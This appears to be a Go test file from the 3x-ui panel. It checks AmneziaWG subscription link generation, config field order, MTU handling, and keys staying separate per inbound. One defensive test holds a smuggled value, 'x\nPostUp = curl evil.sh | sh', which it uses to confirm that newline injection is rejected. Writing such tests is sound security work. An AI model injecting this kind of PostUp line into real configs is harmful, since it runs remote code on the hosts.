package sub

import (
	"encoding/base64"
	"fmt"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/mhsanaei/3x-ui/v3/internal/amneziawg"
	"github.com/mhsanaei/3x-ui/v3/internal/database"
	"github.com/mhsanaei/3x-ui/v3/internal/database/model"
	wgutil "github.com/mhsanaei/3x-ui/v3/internal/util/wireguard"
)

// TestGenAmneziaWGLinkFields covers the real AmneziaVPN app's vpn:// scheme:
// base64url (no padding) of a plain AmneziaWG .conf text, parsed by the real
// app as a flat "Key = Value" bag (confirmed by reading its own source).
func TestGenAmneziaWGLinkFields(t *testing.T) {
	serverPriv, serverPub, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("keypair: %v", err)
	}
	clientPriv, _, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("client keypair: %v", err)
	}

	inbound := &model.Inbound{
		Listen:   "203.0.113.7",
		Port:     51820,
		Protocol: model.AmneziaWG,
		Remark:   "awg-sub",
		Settings: `{"server":{"privateKey":"` + serverPriv + `","publicKey":"` + serverPub + `","mtu":1420,"primaryDns":"8.8.8.8"},` +
			`"clients":[{"email":"user","privateKey":"` + clientPriv + `","allowedIPs":["10.8.1.2/32"],"keepAlive":25}]}`,
	}

	s := &SubService{}
	link := s.genAmneziaWGLink(inbound, "user")

	if !strings.HasPrefix(link, "vpn://") {
		t.Fatalf("link = %q, want vpn:// prefix", link)
	}
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(link, "vpn://"))
	if err != nil {
		t.Fatalf("link body does not decode as base64url: %v\n got: %s", err, link)
	}
	text := string(raw)

	for _, want := range []string{
		"[Interface]",
		"PrivateKey = " + clientPriv,
		"Address = 10.8.1.2/32",
		"MTU = 1420",
		"DNS = 8.8.8.8",
		"[Peer]",
		"PublicKey = " + serverPub,
		"Endpoint = 203.0.113.7:51820",
		"PersistentKeepalive = 25",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("decoded config missing %q\n got: %s", want, text)
		}
	}

	// The server block sets none of the 3.1 fields: none may leak into the
	// client config (a lone HeaderProtectionKey would break the handshake).
	for _, absent := range []string{"HeaderProtectionKey", "RandomTrailers", "DisableCookies", "RekeyAfterTime", "ContentPaddingAddition"} {
		if strings.Contains(text, absent) {
			t.Fatalf("config must omit unset 3.1 field %q\n got: %s", absent, text)
		}
	}
}

// TestGenAmneziaWGLink31Fields pins the AmneziaWG 3.1 [Interface] lines and
// their order in the decoded vpn:// payload — client and server configs must
// carry the identical parameter block for the tunnel to work.
func TestGenAmneziaWGLink31Fields(t *testing.T) {
	serverPriv, serverPub, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("keypair: %v", err)
	}
	clientPriv, _, err := wgutil.GenerateWireguardKeypair()
	if err != nil {
		t.Fatalf("client keypair: %v", err)
	}

	inbound := &model.Inbound{
		Listen:   "203.0.113.7",
		Port:     51820,
		Protocol: model.AmneziaWG,
		Remark:   "awg-31",
		Settings: `{"server":{"privateKey":"` + serverPriv + `","publicKey":"` + serverPub + `",` +
			`"jc":4,"jmin":40,"jmax":100,"s1":30,"s2":90,"s3":20,"s4":10,` +
			`"h1":"10-2000","h2":"3000-5000","h3":"6000-8000","h4":"9000-11000",` +
			`"i1":"<r 64>","i2":"<r 80>",` +
			`"headerProtectionKey":"MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=",` +
			`"contentPaddingAddition":"16-48","rekeyAfterTime":"110-140","rekeyTimeout":"4-8",` +
			`"rejectAfterTime":"190-250","keepaliveTimeout":"9-15","maxHandshakeAttempts":"20-40",` +
			`"randomTrailers":true,"disableCookies":true},` +
			`"clients":[{"email":"user","privateKey":"` + clientPriv + `","allowedIPs":["10.8.1.2/32"]}]}`,
	}

	s := &SubService{}
	link := s.genAmneziaWGLink(inbound, "user")
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(link, "vpn://"))
	if err != nil {
		t.Fatalf("link body does not decode as base64url: %v\n got: %s", err, link)
	}
	text := string(raw)

	want := []string{
		"Jc = 4",
		"H4 = 9000-11000",
		"I1 = <r 64>",
		"I2 = <r 80>",
		"HeaderProtectionKey = MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=",
		"ContentPaddingAddition = 16-48",
		"RekeyAfterTime = 110-140",
		"RekeyTimeout = 4-8",
		"RejectAfterTime = 190-250",
		"KeepaliveTimeout = 9-15",
		"MaxHandshakeAttempts = 20-40",
		"RandomTrailers = on",
		"DisableCookies = on",
		"[Peer]",
	}
	pos := -1
	for _, w := range want {
		i := strings.Index(text, w)
		if i < 0 {
			t.Fatalf("decoded config missing %q\n got: %s", w, text)
		}
		if i < pos {
			t.Fatalf("%q out of order in decoded config:\n%s", w, text)
		}
		pos = i
	}
}

func TestGenAmneziaWGLinkWrongProtocol(t *testing.T) {
	s := &SubService{}
	vless := &model.Inbound{Protocol: model.VLESS, Settings: `{"clients":[{"email":"user"}]}`}
	if got := s.genAmneziaWGLink(vless, "user"); got != "" {
		t.Fatalf("wrong protocol should yield empty link, got %q", got)
	}
}

func TestGenAmneziaWGLinkNoKey(t *testing.T) {
	s := &SubService{}
	inbound := &model.Inbound{
		Protocol: model.AmneziaWG,
		Port:     51820,
		Settings: `{"server":{"privateKey":"x","publicKey":"y"},"clients":[{"email":"user"}]}`,
	}
	if got := s.genAmneziaWGLink(inbound, "user"); got != "" {
		t.Fatalf("client without private key should yield empty link, got %q", got)
	}
}

// Regression test for the bug where getInboundsBySubId's SQL allowlist was
// missing 'amneziawg', silently excluding every AmneziaWG client from
// subscriptions (plain/individual links, JSON, Clash) even though
// genAmneziaWGLink itself was already fully implemented and wired into
// GetLink's dispatch switch.
func TestGetInboundsBySubIdIncludesAmneziaWG(t *testing.T) {
	initSubDB(t)
	db := database.GetDB()

	in := &model.Inbound{Port: 51820, Protocol: model.AmneziaWG, Enable: true, Tag: "awg-sub", Settings: `{"server":{"privateKey":"x","publicKey":"y"},"clients":[]}`}
	if err := db.Create(in).Error; err != nil {
		t.Fatalf("create inbound: %v", err)
	}
	rec := &model.ClientRecord{Email: "u@awg", SubID: "subawg", Enable: true}
	if err := db.Create(rec).Error; err != nil {
		t.Fatalf("create client: %v", err)
	}
	if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: in.Id}).Error; err != nil {
		t.Fatalf("create link: %v", err)
	}

	s := &SubService{}
	inbounds, err := s.getInboundsBySubId("subawg")
	if err != nil {
		t.Fatalf("getInboundsBySubId: %v", err)
	}
	if len(inbounds) != 1 || inbounds[0].Id != in.Id {
		t.Fatalf("amneziawg inbound not returned for subId: %+v", inbounds)
	}
}

// peerFieldOrder is wg-quick(8)'s own [Peer] order. The panel emits an
// AmneziaWG .conf from three independent places -- this one, and the frontend's
// genAmneziaWGConfig and buildAmneziaWGClientConfig -- and a user comparing a
// subscription link against a downloaded .conf sees any drift immediately.
var peerFieldOrder = []string{"PublicKey", "PresharedKey", "AllowedIPs", "Endpoint", "PersistentKeepalive"}

func peerFields(t *testing.T, conf string) []string {
	t.Helper()
	idx := strings.Index(conf, "[Peer]")
	if idx < 0 {
		t.Fatalf("config has no [Peer] block:\n%s", conf)
	}
	var got []string
	for line := range strings.SplitSeq(conf[idx:], "\n") {
		key := strings.TrimSpace(strings.SplitN(line, "=", 2)[0])
		if slices.Contains(peerFieldOrder, key) {
			got = append(got, key)
		}
	}
	return got
}

func TestAmneziaWGConfigTextPeerFieldOrder(t *testing.T) {
	server := &amneziawg.ServerSettings{PublicKey: "serverPub", PrimaryDNS: "8.8.8.8", MTU: 1420}

	t.Run("every optional field set", func(t *testing.T) {
		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}, PreSharedKey: "psk", KeepAlive: model.KeepAlivePtr(25)}
		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
		if got := peerFields(t, conf); !slices.Equal(got, peerFieldOrder) {
			t.Fatalf("peer fields = %v, want %v\n%s", got, peerFieldOrder, conf)
		}
		// No trailing newline, whichever optional field happens to be last --
		// the frontend emitters end the same way for the same client.
		if strings.HasSuffix(conf, "\n") {
			t.Fatalf("config must not end with a newline:\n%q", conf)
		}
	})

	t.Run("no preshared key or keepalive", func(t *testing.T) {
		client := &model.Client{PrivateKey: "clientPriv", AllowedIPs: []string{"10.8.1.2/32"}}
		conf := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "remark")
		want := []string{"PublicKey", "AllowedIPs", "Endpoint"}
		if got := peerFields(t, conf); !slices.Equal(got, want) {
			t.Fatalf("peer fields = %v, want %v\n%s", got, want, conf)
		}
		if strings.HasSuffix(conf, "\n") {
			t.Fatalf("config must not end with a newline:\n%q", conf)
		}
	})
}

// A newline in a field that lands unescaped in [Interface] would inject a
// config line (e.g. a rogue PostUp); the emitter must refuse to render it.
func TestAmneziaWGConfigTextRejectsNewlineInjection(t *testing.T) {
	server := &amneziawg.ServerSettings{
		PublicKey:  "serverPub==",
		PrimaryDNS: "8.8.8.8",
		Jc:         4, Jmin: 40, Jmax: 100, S1: 30, S2: 90,
	}
	client := &model.Client{Email: "peer-1", PrivateKey: "clientPriv==", AllowedIPs: []string{"10.8.1.2/32"}}

	clean := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1")
	if !strings.Contains(clean, "PrivateKey = clientPriv==") {
		t.Fatalf("clean input did not render: %q", clean)
	}

	injected := "x\nPostUp = curl evil.sh | sh"
	cases := []struct {
		name   string
		mutate func(s *amneziawg.ServerSettings, c *model.Client) string
	}{
		{"privateKey", func(s *amneziawg.ServerSettings, c *model.Client) string { c.PrivateKey = injected; return "peer-1" }},
		{"primaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.PrimaryDNS = injected; return "peer-1" }},
		{"secondaryDns", func(s *amneziawg.ServerSettings, c *model.Client) string { s.SecondaryDNS = injected; return "peer-1" }},
		{"remark", func(s *amneziawg.ServerSettings, c *model.Client) string { return injected }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := *server
			c := *client
			remark := tc.mutate(&s, &c)
			if got := amneziaWGConfigText(&s, &c, "203.0.113.7", 51820, remark); got != "" {
				t.Fatalf("%s with a newline rendered a config:\n%s", tc.name, got)
			}
		})
	}
}

// Guards an asymmetry: the server derives its MTU from S4, but a config with no
// MTU line leaves the client at 1420 and fragments client-to-server only.
func TestAmneziaWGConfigTextAlwaysCarriesTheServerMTU(t *testing.T) {
	t.Parallel()

	client := &model.Client{
		Email:      "peer-1",
		PrivateKey: "clientPrivateKeyBase64ValueForTests00000000=",
		AllowedIPs: []string{"10.8.1.2/32"},
	}
	cases := []struct {
		name      string
		serverMTU int
		s4        int
		want      string
	}{
		{"unset falls back to the S4-aware default", 0, 27, "MTU = 1393"},
		{"unset with no S4 keeps the plain default", 0, 0, "MTU = 1420"},
		{"an explicit MTU wins", 1380, 27, "MTU = 1380"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			server := &amneziawg.ServerSettings{
				PublicKey: "serverPubKeyBase64ValueForTests000000000000=",
				MTU:       tc.serverMTU,
				S4:        tc.s4,
			}
			got := amneziaWGConfigText(server, client, "203.0.113.7", 51820, "peer-1")
			if !strings.Contains(got, tc.want+"\n") {
				t.Errorf("expected %q in the client config\n%s", tc.want, got)
			}
			want := "MTU = " + strconv.Itoa(amneziawg.EffectiveMTU(tc.serverMTU, tc.s4))
			if !strings.Contains(got, want+"\n") {
				t.Errorf("client MTU must equal the server's effective MTU (%s)", want)
			}
		})
	}
}

func decodeAmneziaWGSubLink(t *testing.T, link string) string {
	t.Helper()
	if !strings.HasPrefix(link, "vpn://") {
		t.Fatalf("link = %q, want vpn:// prefix", link)
	}
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(link, "vpn://"))
	if err != nil {
		t.Fatalf("decode vpn link: %v\n got: %s", err, link)
	}
	return string(raw)
}

// The shared clients row holds the last sync's tunnel identity. Each vpn://
// entry must keep its own inbound address and private key, in either sort order (#6641).
func TestGetSubs_PreservesPerInboundAmneziaWGIdentity(t *testing.T) {
	serverAPriv, serverAPub := mustWireguardKeypair(t)
	serverBPriv, serverBPub := mustWireguardKeypair(t)
	privA, _ := mustWireguardKeypair(t)
	privB, _ := mustWireguardKeypair(t)
	mergedPriv, _ := mustWireguardKeypair(t)

	const (
		email      = "dual@awg"
		subID      = "sub-awg-identity"
		mergedAddr = "10.9.9.9/32"
	)
	nodes := []struct {
		tag, listen, addr, priv, serverPriv, serverPub string
		port                                           int
	}{
		{"awg-a", "203.0.113.10", "10.8.1.2/32", privA, serverAPriv, serverAPub, 51820},
		{"awg-b", "203.0.113.11", "10.8.2.2/32", privB, serverBPriv, serverBPub, 51821},
	}

	for _, tc := range []struct {
		name  string
		sort  [2]int
		order [2]int
	}{
		{name: "creation order", sort: [2]int{1, 2}, order: [2]int{0, 1}},
		{name: "reversed subscription sort", sort: [2]int{2, 1}, order: [2]int{1, 0}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			initSubDB(t)
			db := database.GetDB()
			inbounds := make([]*model.Inbound, len(nodes))
			for i, n := range nodes {
				settings := fmt.Sprintf(
					`{"server":{"privateKey":%q,"publicKey":%q,"mtu":1420},"clients":[{"email":%q,"privateKey":%q,"allowedIPs":[%q],"enable":true}]}`,
					n.serverPriv, n.serverPub, email, n.priv, n.addr,
				)
				ib := &model.Inbound{
					UserId: 1, Tag: n.tag, Enable: true, Listen: n.listen, Port: n.port,
					Protocol: model.AmneziaWG, Remark: n.tag, Settings: settings, SubSortIndex: tc.sort[i],
				}
				if err := db.Create(ib).Error; err != nil {
					t.Fatalf("create %s: %v", n.tag, err)
				}
				inbounds[i] = ib
			}
			rec := &model.ClientRecord{
				Email: email, SubID: subID, Enable: true,
				PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
				PreSharedKey: "sharedpsk", KeepAlive: 25,
			}
			if err := db.Create(rec).Error; err != nil {
				t.Fatalf("create client: %v", err)
			}
			for _, ib := range inbounds {
				if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: ib.Id}).Error; err != nil {
					t.Fatalf("link %s: %v", ib.Tag, err)
				}
			}

			links, _, _, _, err := NewSubService("").GetSubs(subID, "sub.example.com")
			if err != nil {
				t.Fatalf("GetSubs: %v", err)
			}
			if len(links) != len(nodes) {
				t.Fatalf("links = %d, want %d: %v", len(links), len(nodes), links)
			}
			for outIdx, nodeIdx := range tc.order {
				n := nodes[nodeIdx]
				other := nodes[1-nodeIdx]
				conf := decodeAmneziaWGSubLink(t, links[outIdx])
				for _, want := range []string{
					"PrivateKey = " + n.priv,
					"Address = " + n.addr,
					"PublicKey = " + n.serverPub,
					fmt.Sprintf("Endpoint = %s:%d", n.listen, n.port),
				} {
					if !strings.Contains(conf, want) {
						t.Fatalf("config missing %q\n%s", want, conf)
					}
				}
				for _, leaked := range []string{mergedPriv, mergedAddr, "sharedpsk", "PresharedKey", "PersistentKeepalive", other.priv, other.addr, other.serverPub} {
					if strings.Contains(conf, leaked) {
						t.Fatalf("config leaked %q\n%s", leaked, conf)
					}
				}
			}
		})
	}
}

// A peer missing from settings, or settings that do not parse, must not emit the
// shared clients.wg_* identity. A sibling inbound with its own peer still does (#6641).
func TestGetSubs_AmneziaWGUnavailableSettingsEmitNoSharedConfig(t *testing.T) {
	initSubDB(t)
	db := database.GetDB()
	serverPriv, serverPub := mustWireguardKeypair(t)
	validPriv, _ := mustWireguardKeypair(t)
	otherPriv, _ := mustWireguardKeypair(t)
	mergedPriv, _ := mustWireguardKeypair(t)

	const (
		email      = "dual@awg"
		subID      = "sub-awg-missing"
		validAddr  = "10.8.1.4/32"
		mergedAddr = "10.9.9.9/32"
	)
	validSettings := fmt.Sprintf(
		`{"server":{"privateKey":%q,"publicKey":%q,"mtu":1420},"clients":[{"email":%q,"privateKey":%q,"allowedIPs":[%q],"enable":true}]}`,
		serverPriv, serverPub, email, validPriv, validAddr,
	)
	absentSettings := fmt.Sprintf(
		`{"server":{"privateKey":%q,"publicKey":%q,"mtu":1420},"clients":[{"email":"someone-else@awg","privateKey":%q,"allowedIPs":["10.8.9.9/32"],"enable":true}]}`,
		serverPriv, serverPub, otherPriv,
	)
	specs := []struct {
		tag, listen, settings string
		port                  int
	}{
		{"awg-bad-json", "203.0.113.31", `{not-json`, 51831},
		{"awg-absent-peer", "203.0.113.32", absentSettings, 51832},
		{"awg-valid", "203.0.113.33", validSettings, 51833},
	}
	inbounds := make([]*model.Inbound, len(specs))
	for i, sp := range specs {
		ib := &model.Inbound{
			UserId: 1, Tag: sp.tag, Enable: true, Listen: sp.listen, Port: sp.port,
			Protocol: model.AmneziaWG, Remark: sp.tag, Settings: sp.settings, SubSortIndex: i + 1,
		}
		if err := db.Create(ib).Error; err != nil {
			t.Fatalf("create %s: %v", sp.tag, err)
		}
		inbounds[i] = ib
	}
	rec := &model.ClientRecord{
		Email: email, SubID: subID, Enable: true,
		PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
		PreSharedKey: "sharedpsk", KeepAlive: 25,
	}
	if err := db.Create(rec).Error; err != nil {
		t.Fatalf("create client: %v", err)
	}
	for _, ib := range inbounds {
		if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: ib.Id}).Error; err != nil {
			t.Fatalf("link %s: %v", ib.Tag, err)
		}
	}

	links, _, _, _, err := NewSubService("").GetSubs(subID, "sub.example.com")
	if err != nil {
		t.Fatalf("GetSubs: %v", err)
	}
	if len(links) != 1 {
		t.Fatalf("links = %d, want 1 (absent and malformed inbounds must not emit the shared row): %q", len(links), links)
	}
	conf := decodeAmneziaWGSubLink(t, links[0])
	for _, want := range []string{
		"PrivateKey = " + validPriv,
		"Address = " + validAddr,
		"Endpoint = 203.0.113.33:51833",
	} {
		if !strings.Contains(conf, want) {
			t.Fatalf("config missing %q\n%s", want, conf)
		}
	}
	for _, leaked := range []string{mergedPriv, mergedAddr, "sharedpsk", otherPriv, "10.8.9.9/32", "203.0.113.31", "203.0.113.32", "PresharedKey", "PersistentKeepalive"} {
		if strings.Contains(conf, leaked) {
			t.Fatalf("config leaked %q\n%s", leaked, conf)
		}
	}
}

// Explicit empty preshared key and keepalive must not inherit the shared row (#6641).
func TestGetSubs_AmneziaWGEmptyOptionalTunnelFieldsDoNotInheritShared(t *testing.T) {
	initSubDB(t)
	db := database.GetDB()
	serverPriv, serverPub := mustWireguardKeypair(t)
	clientPriv, _ := mustWireguardKeypair(t)
	mergedPriv, _ := mustWireguardKeypair(t)

	const (
		email      = "optional@awg"
		subID      = "sub-awg-optional"
		addr       = "10.8.1.8/32"
		mergedAddr = "10.9.9.9/32"
	)
	settings := fmt.Sprintf(
		`{"server":{"privateKey":%q,"publicKey":%q,"mtu":1420},"clients":[{"email":%q,"privateKey":%q,"allowedIPs":[%q],"preSharedKey":"","keepAlive":0,"enable":true}]}`,
		serverPriv, serverPub, email, clientPriv, addr,
	)
	ib := &model.Inbound{
		UserId: 1, Tag: "awg-optional", Enable: true, Listen: "203.0.113.40", Port: 51840,
		Protocol: model.AmneziaWG, Remark: "awg-optional", Settings: settings,
	}
	if err := db.Create(ib).Error; err != nil {
		t.Fatalf("create inbound: %v", err)
	}
	rec := &model.ClientRecord{
		Email: email, SubID: subID, Enable: true,
		PrivateKey: mergedPriv, AllowedIPs: mergedAddr,
		PreSharedKey: "sharedpsk", KeepAlive: 25,
	}
	if err := db.Create(rec).Error; err != nil {
		t.Fatalf("create client: %v", err)
	}
	if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: ib.Id}).Error; err != nil {
		t.Fatalf("link client: %v", err)
	}

	links, _, _, _, err := NewSubService("").GetSubs(subID, "sub.example.com")
	if err != nil {
		t.Fatalf("GetSubs: %v", err)
	}
	if len(links) != 1 {
		t.Fatalf("links = %d, want 1: %q", len(links), links)
	}
	conf := decodeAmneziaWGSubLink(t, links[0])
	for _, want := range []string{"PrivateKey = " + clientPriv, "Address = " + addr} {
		if !strings.Contains(conf, want) {
			t.Fatalf("config missing %q\n%s", want, conf)
		}
	}
	for _, leaked := range []string{"PresharedKey", "PersistentKeepalive", "sharedpsk", mergedPriv, mergedAddr} {
		if strings.Contains(conf, leaked) {
			t.Fatalf("config leaked %q\n%s", leaked, conf)
		}
	}
}

// Membership and account metadata stay on the normalized row. Settings may carry a
// stale subId/enable and an extra email; tunnel fields still come from this inbound (#6641).
func TestMatchingClients_TunnelMetadataStaysNormalized(t *testing.T) {
	const (
		subID       = "sub-meta"
		email       = "user@awg"
		freshID     = "11111111-2222-4333-8444-555555555555"
		staleID     = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
		settingsKey = "settings-private-key"
		sharedKey   = "shared-private-key"
		expiry      = int64(1700000000000)
	)
	clientsJSON := fmt.Sprintf(`[
		{"id":%q,"email":"User@AWG","subId":"stale-sub","enable":false,"totalGB":1,"expiryTime":1,"comment":"stale","limitIp":9,"privateKey":%q,"publicKey":"settings-pub","allowedIPs":["10.8.1.2/32","fd00::2/128"],"preSharedKey":"settings-psk","keepAlive":15},
		{"email":"settings-only@awg","subId":%q,"enable":true,"privateKey":"only-priv","allowedIPs":["10.8.1.9/32"]}
	]`, staleID, settingsKey, subID)

	for _, protocol := range []model.Protocol{model.AmneziaWG, model.WireGuard} {
		t.Run(string(protocol), func(t *testing.T) {
			initSubDB(t)
			db := database.GetDB()
			settings := `{"secretKey":"c2VydmVy","clients":` + clientsJSON + `}`
			if protocol == model.AmneziaWG {
				settings = `{"server":{"privateKey":"c2VydmVy","publicKey":"cHVi"},"clients":` + clientsJSON + `}`
			}
			ib := &model.Inbound{
				UserId: 1, Tag: "meta-" + string(protocol), Enable: true, Listen: "203.0.113.50", Port: 51850,
				Protocol: protocol, Remark: "meta", Settings: settings,
			}
			if err := db.Create(ib).Error; err != nil {
				t.Fatalf("create inbound: %v", err)
			}
			rec := &model.ClientRecord{
				Email: email, SubID: subID, UUID: freshID, Enable: true,
				TotalGB: 5, ExpiryTime: expiry, Comment: "vip", LimitIP: 3,
				PrivateKey: sharedKey, PublicKey: "shared-pub", AllowedIPs: "10.9.9.9/32",
				PreSharedKey: "shared-psk", KeepAlive: 99,
			}
			other := &model.ClientRecord{
				Email: "other-sub@awg", SubID: "other-sub", UUID: "22222222-2222-4333-8444-555555555555", Enable: true,
			}
			for _, row := range []*model.ClientRecord{rec, other} {
				if err := db.Create(row).Error; err != nil {
					t.Fatalf("create client %s: %v", row.Email, err)
				}
				if err := db.Create(&model.ClientInbound{ClientId: row.Id, InboundId: ib.Id}).Error; err != nil {
					t.Fatalf("link %s: %v", row.Email, err)
				}
			}

			s := &SubService{}
			got := s.matchingClients(ib, subID)
			if len(got) != 1 {
				t.Fatalf("clients = %d, want the one normalized member: %+v", len(got), got)
			}
			c := got[0]
			if c.Email != email || c.ID != freshID || c.SubID != subID || !c.Enable || c.TotalGB != 5 || c.ExpiryTime != expiry || c.Comment != "vip" || c.LimitIP != 3 {
				t.Fatalf("normalized metadata = %+v", c)
			}
			if c.PrivateKey != settingsKey || c.PublicKey != "settings-pub" || c.PreSharedKey != "settings-psk" || c.KeepAliveSeconds() != 15 {
				t.Fatalf("tunnel identity = key %q pub %q psk %q ka %d", c.PrivateKey, c.PublicKey, c.PreSharedKey, c.KeepAliveSeconds())
			}
			if !slices.Equal(c.AllowedIPs, []string{"10.8.1.2/32", "fd00::2/128"}) {
				t.Fatalf("allowedIPs = %v, want this inbound's v4 and v6", c.AllowedIPs)
			}
			cached, ok := s.clientForLink(ib, email)
			if !ok || cached.PrivateKey != settingsKey || cached.PreSharedKey != "settings-psk" || cached.KeepAliveSeconds() != 15 || !slices.Equal(cached.AllowedIPs, c.AllowedIPs) {
				t.Fatalf("primed cache = %+v, ok %v", cached, ok)
			}
			if extra := s.matchingClients(ib, "nope"); len(extra) != 0 {
				t.Fatalf("non-matching subId must yield 0 clients, got %d", len(extra))
			}
		})
	}
}
